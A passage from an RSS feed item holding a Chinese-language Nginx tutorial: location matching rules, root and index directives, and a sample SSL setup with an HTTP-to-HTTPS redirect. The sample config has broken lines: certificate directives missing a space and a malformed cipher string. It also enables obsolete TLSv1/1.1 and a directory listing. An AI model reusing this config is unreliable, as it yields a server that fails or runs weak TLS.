&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;~&amp;#34;：用于正则 uri 前，并且区分大小写
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;~*&amp;#34;：用于正则 uri 前，但不区分大小写
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# &amp;#34;^~&amp;#34;：用于标准 uri 前，要求 Nginx 找到标识 uri 和请求字符串匹配度最高的 location 后，立即使用此 location 处理请求，而不再使用 location 块中的正则 uri 和请求字符串做匹配
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/404.html&lt;/span&gt;{&lt;span style=&#34;color:#f92672&#34;&gt;...}&lt;/span&gt;;  &lt;span style=&#34;color:#75715e&#34;&gt;# 示例
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;root&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;path&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# path：Nginx 接收到请求以后查找资源的根目录路径
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-------------------------------------------------------------------------------------------------&lt;/span&gt;
&lt;span style=&#34;color:#e6db74&#34;&gt;index&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;file&lt;/span&gt;;
&lt;span style=&#34;color:#75715e&#34;&gt;# 设置网站的默认首页
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# file:可以包含多个用空格隔开的文件名，首先找到哪个页面，就使用哪个页面响应请求
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3nginx-配置-ssl-及-http-跳转到-https-示例&#34;&gt;3.Nginx 配置 SSL 及 HTTP 跳转到 HTTPS 示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-nginx&#34; data-lang=&#34;nginx&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Nginx 配置 SSL 并把 Http 跳转到 Https，需修改 Nginx.conf 配置文件如下
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;server&lt;/span&gt; {

  &lt;span style=&#34;color:#f92672&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;server_name&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;www.example.com&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;301&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;https://www.example.com&lt;/span&gt;$request_uri;

  &lt;span style=&#34;color:#75715e&#34;&gt;# 把 http 重定向到 https 使用了nginx 的重定向命令
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# return 301 https://www.example.com$request_uri;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;}

&lt;span style=&#34;color:#66d9ef&#34;&gt;server&lt;/span&gt; {

  &lt;span style=&#34;color:#f92672&#34;&gt;listen&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;443&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;server_name&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;www.example.com&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;root&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/data/release/weapp/uploadFiles&lt;/span&gt;;

  &lt;span style=&#34;color:#75715e&#34;&gt;# 开启ssl功能
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ssl&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt;;

  &lt;span style=&#34;color:#75715e&#34;&gt;# 配置ssl证书，直接用.pem和.key文件的绝对路径
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;ssl_certificate/data/release/nginx/ssl_file.pem&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;ssl_certificate_key/data/release/nginx/ssl_file.key&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;ssl_session_timeout&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5m&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;ssl_protocols&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;TLSv1&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;TLSv1.1&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;TLSv1.2&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;ssl_ciphers&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;ECDHE&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;RSA&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;AES128&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;GCM&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;SHA256:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;ECDHE:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;ECDH:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;AES:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;HIGH:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;!NULL:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;!aNULL:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;!MD5:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;!ADH:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;!RC4&lt;/span&gt;;
  &lt;span style=&#34;color:#f92672&#34;&gt;ssl_prefer_server_ciphers&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt;;

  &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt; {

     &lt;span style=&#34;color:#f92672&#34;&gt;proxy_pass&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;http://app_weapp&lt;/span&gt;;
     &lt;span style=&#34;color:#f92672&#34;&gt;proxy_http_version&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;.1&lt;/span&gt;;
     &lt;span style=&#34;color:#f92672&#34;&gt;proxy_set_header&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;Upgrade&lt;/span&gt; $http_upgrade;
     &lt;span style=&#34;color:#f92672&#34;&gt;proxy_set_header&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;Connection&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;upgrade&amp;#39;&lt;/span&gt;;
     &lt;span style=&#34;color:#f92672&#34;&gt;proxy_set_header&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;Host&lt;/span&gt; $host;
     &lt;span style=&#34;color:#f92672&#34;&gt;proxy_cache_bypass&lt;/span&gt; $http_upgrade;

  }

  &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/images/&lt;/span&gt; {
    &lt;span style=&#34;color:#f92672&#34;&gt;autoindex&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;on&lt;/span&gt;;
  }

  &lt;span style=&#34;color:#75715e&#34;&gt;# 配置 uri， ~ 用于正则 uri 前，其中 .(png|jpg) 为正则表达式
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;# root 用于配置接收到请求以后查找资源的根目录路径
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; ~ &lt;span style=&#34;color:#e6db74&#34;&gt;\.(png|jpg)&lt;/span&gt; {
     &lt;span style=&#34;color:#f92672&#34;&gt;root&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/data/release/weapp/uploadFiles&lt;/span&gt;;
  }

  &lt;span style=&#34;color:#f92672&#34;&gt;error_page&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;404&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/404.html&lt;/span&gt;;

  &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/40x.html&lt;/span&gt; {
  }

  &lt;span style=&#34;color:#f92672&#34;&gt;error_page&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;500&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;502&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;503&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;504&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;/50x.html&lt;/span&gt;;

  &lt;span style=&#34;color:#f92672&#34;&gt;location&lt;/span&gt; = &lt;span style=&#34;color:#e6db74&#34;&gt;/50x.html&lt;/span&gt; {
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        
    </channel>
</rss>
